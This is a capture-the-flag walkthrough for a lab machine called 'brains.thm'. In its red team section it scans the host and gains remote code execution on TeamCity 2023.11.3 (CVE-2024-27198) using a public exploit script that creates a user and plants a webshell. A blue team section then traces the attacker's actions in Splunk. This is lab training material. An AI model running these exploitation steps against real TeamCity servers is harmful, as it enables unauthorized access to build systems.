# Enumeration (Red Team)

## \[+] 10.10.195.198 - brains.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.195.198 brains.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.195.198
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

# Initial Foothold

## \[+] Port 50000 - HTTP - TeamCity

### \[-] brains.thm:50000/login.html

Here, we will find the login portal for TeamCity. The version number is at the bottom of the page:

As a side note, before the machine fully loads, we can also find the version number:

![ed23cf48c724d0a9ba628104ac01e671.png](/resources/9fc14e542e6f42518af6ffc819adde51.png)

This version of TeamCity has a Remote Code Execution vulnerability. We can find more information by searching "TeamCity 2023.11.3 exploit" which leads us to one of many write ups, [this one](https://www.splunk.com/en_us/blog/security/security-insights-jetbrains-teamcity-cve-2024-27198-and-cve-2024-27199.html) is by the team at splunk.

### \[-] ubuntu\@brains

We can use this [Python script by W01fh4cker](https://github.com/W01fh4cker/CVE-2024-27198-RCE) to create a new user then upload a webshell and allow us to execute commands on the victim machine.

After downloading the script and installing the necessary dependencies, we can run the following command to execute the payload and enter `y` when prompted:

```sh
python3 CVE-2024-27198-RCE.py -t http://brains.thm:50000
```

To get the user flag, we can start by enumerating the user's home directory by using the `ls` command:

```sh
ls -lah /home/ubuntu/
```

We cannot directly `cat` the file at this point, so to get around this we will copy the `flag.txt` file to our current directory, then read it from here:

```sh
cp /home/ubuntu/flag.txt .
cat flag.txt
```

# Splunk (Blue Team)

To find the username added by the attacker, we can search for the `useradd` command in Splunk and make sure to change the date range to "All time":

We will find the suspicious username in the latest entries:

To find the suspicious package the attacker installed, we will start by searching for the `install` command, then review the entries around the time and date the `eviluser` account was created:

![ff573669a19546d99f90d5c9b15b18cb.png](/resources/96f6b986f3f74bd998d95a65df554a6e.png)

To find the suspicious plugin the attacker installed, we will search for the string `plugin` and find one entry that stands out from the rest:
